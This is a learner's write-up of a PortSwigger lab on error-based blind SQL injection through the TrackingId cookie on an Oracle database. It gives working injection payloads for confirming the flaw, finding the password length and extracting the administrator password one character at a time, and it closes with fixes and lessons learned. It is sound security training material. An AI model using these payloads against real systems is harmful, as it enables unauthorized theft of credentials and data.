## LAB 13 — BLIND SQL INJECTION WITH CONDITIONAL ERRORS

## LAB : [PortSwigger Lab 13 Link](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

## What?

**Error-based Blind SQL Injection** in the `TrackingId` cookie on an **Oracle** database. The application returns no query results and no boolean message, but leaks information through **custom error messages** when the SQL query causes an error.

## Where?

* **Page:** Front page of the shop
* **Method:** `GET` (cookie-based)
* **Parameter:** `TrackingId` cookie
* **No auth required**

## How did I find it?

### Step 1 — Confirm SQL injection:

* `TrackingId=xyz'` → **500 error** (unclosed quote)
* `TrackingId=xyz''` → **200 OK** (quote escaped)
* `TrackingId=xyz'||(SELECT '')||'` → **500 error** (Oracle requires FROM clause)
* `TrackingId=xyz'||(SELECT '' FROM dual)||'` → **200 OK** (valid Oracle syntax)

### Step 2 — Confirm injection is processed as SQL:

* `TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'` → **500 error**
* This proves the backend is executing the injected query, not just doing string matching.

## How did I verify it?

### Step 3 — Confirm users table exists:

```plain id="2v8k1m"
TrackingId=xyz'||(SELECT
'' FROM users WHERE ROWNUM=1)||'
```

→ **200 OK** = table exists (no error)

### Step 4 — Confirm administrator user exists (CASE method):

```plain id="7c4n9p"
TrackingId=xyz'||(SELECT
CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE
username='administrator')||'
```

→ **500 error** = user exists (row returned, `1/0` fires)

```plain id="5h2r6x"
TrackingId=xyz'||(SELECT
CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE
username='randomuser')||'
```

→ **200 OK** = user does not exist (no rows, subquery is NULL, no error)

### Step 5 — Determine password length:

```plain id="9j6s3q"
TrackingId=xyz'||(SELECT
CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE
username='administrator')||'
```

→ **500** (true, password > 1 char)

```plain id="1w7d5k"
TrackingId=xyz'||(SELECT
CASE WHEN LENGTH(password)>25 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE
username='administrator')||'
```

→ **200** (false, password ≤ 25)

Used Burp Intruder to binary search → **password length = 20**

### Step 6 — Extract password character-by-character:

Used **Burp Intruder Cluster Bomb** with two payload positions:

```plain id="4m8q2z"
TrackingId=xyz'||(SELECT
CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users
WHERE username='administrator')||'
```

* **Position 1:** Character offset (1–20)
* **Position 2:** Character value (a–z, 0–9)

Filtered results by **HTTP 500 status** (true condition). Extracted password: **l074o0c2balb112fbs9z**

## Why does it work?

The backend query:

```sql id="6p3x8v"
SELECT
tracking-id FROM tracking-table WHERE trackingId = 'xyz' || [INJECTED_SUBQUERY]
|| ''
```

* Oracle `||` is string concatenation — the subquery result is appended to the tracking ID
* If the subquery returns a row and the CASE condition is true → `TO_CHAR(1/0)` executes → **ORA-01476** divide-by-zero → **500 error**
* If the `WHERE` clause filters out all rows → subquery returns **NULL** → `|| NULL ||` is harmless → **200 OK**
* The `CASE WHEN` is the trigger; the `WHERE` clause is the actual test condition
* `ROWNUM=1` prevents multiple rows from breaking the concatenation

## What can an attacker do?

* Extract any data from the database one character at a time
* Enumerate schema, tables, columns without any direct output
* Bypass WAFs and filters that only block visible data exfiltration
* No boolean message or query results needed — only error presence/absence

## What are the conditions/limitations?

* **Oracle database** — requires `FROM dual`, `ROWNUM`, `SUBSTR()` instead of `SUBSTRING()`
* Error messages must be **visible and distinguishable** from normal responses
* Very **slow without automation** — 20 chars × ~36 guesses = ~720 requests
* Assumes password character set is known (lowercase alphanumeric)
* The `TrackingId` value must be injectable in a string context with `||` concatenation

## How should it be fixed?

**Primary:** Use **parameterized queries** so `TrackingId` is bound as data.

**Defense-in-depth:**

* Never concatenate cookie values into SQL queries
* Implement generic error handling that does not expose database error details
* Rate-limiting to slow automated enumeration
* Strong password hashing (bcrypt/Argon2)

## What did I learn?

I learned that **error-based blind SQLi** uses the database's own error mechanism as an oracle. The `CASE WHEN ... THEN TO_CHAR(1/0)` pattern is the core technique — it turns a boolean condition into a database error. I also learned Oracle-specific quirks: `FROM dual` is mandatory, `ROWNUM=1` prevents multi-row issues, and `||` is the concatenation operator. The key insight: **control whether a row is returned, and you control whether an error fires.**

## What was the key obstacle?

**No visible output at all.** Unlike previous labs with "Welcome back" messages or reflected data, here I only had HTTP status codes (500 vs 200). I had to trust that a 500 meant "condition true" and 200 meant "condition false." The CASE + `1/0` trick was the bridge between boolean logic and observable behavior. Also, I initially got confused when a random username still returned 200 — that's actually correct behavior (no rows = no error), but it felt wrong because I expected some kind of "not found" message.
